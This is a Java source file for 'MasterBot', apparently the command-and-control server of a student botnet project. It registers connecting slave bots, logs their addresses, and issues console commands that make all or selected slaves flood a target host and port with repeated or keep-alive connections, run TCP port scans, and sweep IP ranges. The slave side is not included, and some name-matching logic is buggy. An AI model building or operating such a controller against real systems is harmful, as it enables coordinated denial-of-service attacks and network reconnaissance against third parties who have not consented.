import java.net.*;
import java.util.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.io.BufferedWriter.*;

public class MasterBot extends Thread {
	static String SlaveName,TargetName, DisConnection,Url,parts,split;
	static int StartPort,EndPort;;

	static int TargetPort,ConnectionCount;
	static boolean keepAlive;
	static ArrayList<Socket> listSlaveBots = new ArrayList<>();
	static SlaveBot b = new SlaveBot();

	public static void main(String [] args) throws IOException {

		int port =Integer.parseInt(args[1]);
		if(port != 0){
			try {
				Thread t = new MasterBot(port);
				t.start();
			
			}catch(IOException e) {
				e.printStackTrace();
				
				System.out.println("Terminating abnormally with exit code -1");
				System.exit(-1);
			}
		}
		try{
		String inputLine;
		BufferedReader input = new BufferedReader
				(new InputStreamReader(System.in));
		BufferedReader br = null;
		
		while (true) {
			
			inputLine = input.readLine();
			
			if (inputLine.equals(""))
				continue;
			

			if (inputLine.endsWith("list"))
			{	
				String para;

				br = new BufferedReader(new FileReader("client_record.txt"));
				if((para = br.readLine()) == null)
				{
					System.out.println("List is Empty");
				}
				else
				{
					br = new BufferedReader(new FileReader("client_record.txt"));
					while ((para = br.readLine()) != null)
					{
						System.out.println(para);
					}
				}				

			}
			if (inputLine.startsWith("connect "))
			{	
				String[] dataArray = inputLine.split("\\s+");
				
				if(dataArray.length == 4) 
				{
					SlaveName = dataArray[1];
					TargetName = dataArray[2];
					TargetPort = Integer.parseInt(dataArray[3]);
					ConnectionCount = 1;
					keepAlive = false;
					Url = "";
					
				}
				else if(dataArray.length == 5)
				{
					
				SlaveName = dataArray[1];
				TargetName = dataArray[2];
				TargetPort = Integer.parseInt(dataArray[3]);
				
					if(dataArray[4].contains("keepAlive") || dataArray[4].contains("keepalive"))
					{
						ConnectionCount = 1;
						keepAlive = true;
						Url = "";
					}
					else if(dataArray[4].contains("url"))
					{
					
						ConnectionCount = 1;
						keepAlive = false;
						Url = dataArray[4];
						
					}
					else
					{
						
						ConnectionCount = Integer.parseInt(dataArray[4]);
						keepAlive = false;
						Url = "";
					}

				}
				else if(dataArray.length == 6)
				{
					SlaveName = dataArray[1];
					TargetName = dataArray[2];
					TargetPort = Integer.parseInt(dataArray[3]);
					if((dataArray[4].contains("keepAlive") || dataArray[4].contains("keepalive")))
						{
							keepAlive = true;
							Url = dataArray[5];
							ConnectionCount = 1;
						}
					else if(dataArray[5].contains("keepAlive") || dataArray[5].contains("keepalive"))
						{
							keepAlive = true;
							ConnectionCount = Integer.parseInt(dataArray[4]);
							Url = ""; 
						}
					else if(dataArray[5].contains("url"))
						{
							keepAlive = false;
							Url = dataArray[5];
							ConnectionCount =Integer.parseInt(dataArray[4]);
						}
				}
				else if(dataArray.length == 7)
				{
					
					SlaveName = dataArray[1];
					TargetName = dataArray[2];
					TargetPort = Integer.parseInt(dataArray[3]);
					ConnectionCount = Integer.parseInt(dataArray[4]);
					keepAlive = true;
					Url = dataArray[6];
					
					
				}
		
				if(SlaveName.equalsIgnoreCase(("all")) || SlaveName.equalsIgnoreCase("localhost") || SlaveName.equalsIgnoreCase("127.0.0.1"))
				{
					
					for(int k=0; k<listSlaveBots.size();k++)
					{	 
						for(int j = 0; j < ConnectionCount;j++)
						{
							b.createSocket(listSlaveBots.get(k),TargetPort,TargetName,ConnectionCount,keepAlive,Url);
						}

					}


				}
				else
				{
					String line,hostNameCheck;
					
					for(int j =0; j< listSlaveBots.size();j++)
					{
						line = "/"+SlaveName;
						hostNameCheck = line;

						if(line.equalsIgnoreCase(listSlaveBots.get(j).getRemoteSocketAddress().toString()))
						{
							
							for(int k = 0; k < ConnectionCount;k++)
							{
							b.createSocket(listSlaveBots.get(j),TargetPort,TargetName,ConnectionCount,keepAlive,Url);
							}
						}
						  else if(hostNameCheck.equalsIgnoreCase("Slave" + (j+1)))
                          {
	
							for(int i=0; i<ConnectionCount; i++)
	
							{
		
								b.createSocket(listSlaveBots.get(j),TargetPort,TargetName,ConnectionCount,keepAlive,Url);	
	                        }
                          } 
					}
				}
			}
					
		if (inputLine.contains("disconnect"))
		{	
			String[] dataArray = inputLine.split("\\s+");
		if(dataArray.length == 3)
		{
			SlaveName = dataArray[1];
			TargetName = dataArray[2];
			TargetPort = 1000;
			
			
		}
		else if(dataArray.length == 4)
		{
			SlaveName = dataArray[1];
			TargetName = dataArray[2];
			TargetPort = Integer.parseInt(dataArray[3]);	
			ConnectionCount = 1;
			
		}
		else if(dataArray.length == 5)
		{
			SlaveName = dataArray[1];
			TargetName = dataArray[2];
			TargetPort = Integer.parseInt(dataArray[3]);	
			ConnectionCount = Integer.parseInt(dataArray[4]);
			
		}
			 if(SlaveName.equalsIgnoreCase("all") ||SlaveName.equalsIgnoreCase("localhost")||SlaveName.equalsIgnoreCase("127.0.0.1"))
				{
				for(int i=0; i<listSlaveBots.size();i++)
				{	
					for(int j=0; j<ConnectionCount; j++)
					{
					 b.disconnect(listSlaveBots.get(i),TargetName,TargetPort);
					}
				}
				}
			 else
			 	{
				 

					String ipCheck, hostNameCheck;
					for(int i=0; i<listSlaveBots.size(); i++)
					{
						ipCheck = "/"+SlaveName;
                                                 hostNameCheck = SlaveName;

						if(ipCheck.equalsIgnoreCase(listSlaveBots.get(i).getRemoteSocketAddress().toString()))
						{
							for(int j=0; j<ConnectionCount; j++)
							{
								b.disconnect(listSlaveBots.get(i), TargetName, TargetPort);
							}
						}
                                                 else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
                                                 {
							for(int j=0; j<ConnectionCount; j++)
							{
								b.disconnect(listSlaveBots.get(i), TargetName, TargetPort);
							}
                                                 } 
					}
				
				 
			 	}
		

		}
		if (inputLine.contains("tcpportscan"))
		{
			String[] dataArray = inputLine.split("\\s+");

			SlaveName = dataArray[1];
			TargetName = dataArray[2];
			parts = dataArray[3];
			String[] port1 = parts.split("-");
			StartPort = Integer.parseInt(port1[0]);
			EndPort = Integer.parseInt(port1[1]);
			if(SlaveName.equalsIgnoreCase("all") ||SlaveName.equalsIgnoreCase("localhost")||SlaveName.equalsIgnoreCase("127.0.0.1"))
			{
			for(int i=0; i<listSlaveBots.size();i++)
			{	
				
				b.tcpslavescan(listSlaveBots.get(i), TargetName, StartPort,EndPort);
			}
			}
			else
		 	{
			
				String ipCheck, hostNameCheck;
				for(int i=0; i<listSlaveBots.size(); i++)
				{
					ipCheck = "/"+SlaveName;
                                             hostNameCheck = SlaveName;

					if(ipCheck.equalsIgnoreCase(listSlaveBots.get(i).getRemoteSocketAddress().toString()))
					{
						for(int j=0; j<ConnectionCount; j++)
						{
							b.tcpslavescan(listSlaveBots.get(i), TargetName, StartPort,EndPort);
						}
					}
                     else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
                    {
						for(int j=0; j<ConnectionCount; j++)
						{
							b.tcpslavescan(listSlaveBots.get(i), TargetName, StartPort,EndPort);
						}
                            } 
				}
			
			 
		 	}
		}
		if (inputLine.contains("ipscan"))
		{
			String[] dataArray = inputLine.split("\\s+");

			SlaveName = dataArray[1];
			split = dataArray[2];
			String[] port1 = dataArray[2].split("\\-");
			String StartIp = port1[0];
			String EndIp= port1[1];
			if(SlaveName.equalsIgnoreCase("all") ||SlaveName.equalsIgnoreCase("localhost")||SlaveName.equalsIgnoreCase("127.0.0.1"))
			{
			for(int i=0; i<listSlaveBots.size();i++)
			{	
				
				b.ipscan(listSlaveBots.get(i),StartIp,EndIp);
			}
			}
		
		
		else
	 	{
		
			String ipCheck, hostNameCheck;
			for(int i=0; i<listSlaveBots.size(); i++)
			{
				ipCheck = "/"+SlaveName;
                                         hostNameCheck = SlaveName;

				if(ipCheck.equalsIgnoreCase(listSlaveBots.get(i).getRemoteSocketAddress().toString()))
				{
					for(int j=0; j<ConnectionCount; j++)
					{
						b.ipscan(listSlaveBots.get(i),StartIp,EndIp);
					}
				}
                 else if(hostNameCheck.equalsIgnoreCase("Slave" + (i+1)))
                {
					for(int j=0; j<ConnectionCount; j++)
					{
						b.ipscan(listSlaveBots.get(i),StartIp,EndIp);
					}
                        } 
			}
		
		 
	 	}
		}
		
		if (inputLine.equals("-1"))
		{	
			System.out.println("...Terminating the Virtual Machine");
		System.out.println("...Done");
		System.out.println("Please Close manually with Options > Close");
		System.exit(0);
		}
		if (inputLine.equals("exit"))
		{	
			System.out.println("...Terminating the Virtual Machine");
		System.out.println("...Done");
		System.out.println("Please Close manually with Options > Close");
		System.exit(0);
		}
	
	
		}
		}catch (Exception e){
			e.printStackTrace();
			System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);}


}

private ServerSocket serverSocket;


public MasterBot(int port) throws IOException {

	serverSocket = new ServerSocket(port);	
}	

public void run() {

	try {
		int count=0;
		BufferedWriter output = null;
		String text = "";
		File file = new File("client_record.txt");
		output = new BufferedWriter(new FileWriter(file));
		text = "SlaveHostName" +"\t"+"IPAddress"+"\t\t"+"SourcePortNumber"+"\t"+"RegistrationDate";
		output.write(text);
		output.newLine();
		while(true)
		{
			count++;

			
			Socket server = new Socket();
			server = serverSocket.accept();
			listSlaveBots.add(server);
			text = "Client:"+count+"\t"  ;
			output.write(text);

			text = server.getRemoteSocketAddress()+"\t";
			output.write(text);

			text = serverSocket.getLocalPort()+"\t"+"\t";
			output.write(text);

			text = "\t"+new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime());
			output.write(text);
			output.newLine();


			output.flush();  

			
		}		   

	}
	catch(IOException e) {
		e.printStackTrace();
		System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);;
	}finally{
		try{
			
			serverSocket.close();
		}catch(IOException e){System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);}
	}

	try {

		String Line;
		BufferedReader reader = null;
		reader = new BufferedReader(new FileReader("client_record.txt"));

		while ((Line = reader.readLine()) != null) {
			System.out.println(Line);
		}

	} catch (IOException e) {
		e.printStackTrace();
		System.out.println("Terminating abnormally with exit code -1");
		System.exit(-1);;
	} 
}	
}